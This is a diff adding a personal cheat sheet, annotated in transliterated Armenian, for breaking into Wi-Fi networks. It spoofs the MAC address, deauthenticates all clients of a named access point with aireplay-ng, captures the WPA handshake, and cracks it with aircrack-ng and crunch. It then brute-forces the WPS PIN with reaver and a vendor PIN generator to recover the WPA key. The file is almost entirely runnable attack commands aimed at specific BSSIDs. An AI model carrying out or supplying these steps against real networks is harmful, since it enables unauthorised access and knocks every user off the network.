@@ -1,0 +1,64 @@
+https://xakep.ru/2012/11/08/wifi-key-with-wps/
+skzbic katarel 
+bacel terminal
+
+ifconfig														->inch interfacner kan
+iwlist wlan0 scan | grep ESSID
+ifconfig wlan0 down												->anjatum enq wlan0 interface(wifi platen)
+macchanger -r wlan0												->poxum enq mac address@
+iwconfig wlan0 mode monitor										->miacnum enq monitor rejim@
+ifconfig wlan0 up												->miacnum enq wlan0 interface@
+iwconfig wlan0													->stugum enq monitor rejimum enq te voch
+
+airmon-ng check wlan0											->inch procesner kan airmon-ng cragrin xangarox petq e kill anenq ayd procesner@
+service network-manager stop   (kam kill 1310)		
+airmon-ng check wlan0
+service wpa_supplicant stop    (kam kill 1469)
+airmon-ng check wlan0											->kill aneluc heto stugum enq ardyoq kill exel en te voch
+
+
+
+						1)exanak aircrack-i mijocov
+bacel arajin terminal
+
+airodump-ng wlan0												->scanavorum enq access pointner@ ev dranc miacvac sarqer@
+
+airodump-ng -c 13 -w SCAN_test --bssid F8:C0:91:25:AC:6C wlan0	->scanavorman amboxj trafik@ grum enq SCAN_test fayleri mej
+
+spasum enq 
+erkrord terminali gorcoxutyunic heto kam @ntacqum petq e haytnvi [ WPA handshake: C8:3A:35:2A:BF:48 vor@ nshanakum o vor stacel enq ayn paketner@
+voronq uxarkel en access pointic anjatvac sarqer@ noric authentificacia ancnelu hamar
+
+
+bacel erkrord terminal
+aireplay-ng -0 0 -a F8:C0:91:25:AC:6C wlan0						->anjatum enq access pointin kpac bolor sarqer@
+																->motavorapes 15 vayrkyan heto sexmum enq CTRL + c
+																->spasum enq minchev arajin terminali vra haytnvi [ WPA handshake: C8:3A:35:2A:BF:48
+
+
+aircrack-ng -w wordlist.txt SCAN_test-01.cap					->aircrack-ng -in poxancum enq hnaravor passwordneri list@ vorpeszi hamemati 											SCAN_test-01.cap miji kodavorvac passwordi het
+crunch 8 8 odasph | aircrack-ng -w - SCAN_test-01.cap -e soutln		->ete chunenq passwordneri list apa crunch -ov generacnum enq passwordner ev 											poxancum aircrack-ng -in
+rm -rf SCAN_test-01.*											->jnjum enq bolor SCAN_test-01. -ov sksvox barer@
+
+
+
+						2)exanak reaver-i mijocov
+
+
+wash -i wlan0 													->imanum enq BSSID    Channel    RSSI    WPS Version    WPS Locked   ESSID
+airodump-ng wlan0 												->stugenq kapi uj@
+reaver -b F8:C0:91:25:AC:6C -i wlan0 -c 6 -vv					->reaver@ porcum e wps pin coder generacnel ev gtnel hamapatasxan pin@
+reaver -i wlan0 -b 90:F6:52:C1:BB:18 -c 6 -r 1:300 -vv			->2 porc 300 vayrkyanum
+	kam 2 exanak)yuraqanchyur router uni algorithm vorov generacnim e piner@ 
+	orinak d-link routerner@ generacnum en piner@ himnvelov mac addresi skzbnamasi vra (pingen.py -> browser->search-> wps algorhitmi dlya d-link)
+						./pingen.py 90:F6:52:C1:BB:18
+
+gitenalov pin@ 
+	reaver -i wlan0 -b 90:F6:52:C1:BB:18 --pin=20172527 -vv     ->stanum enq WPA PSK kod@
+
+
+
+
+
+
+
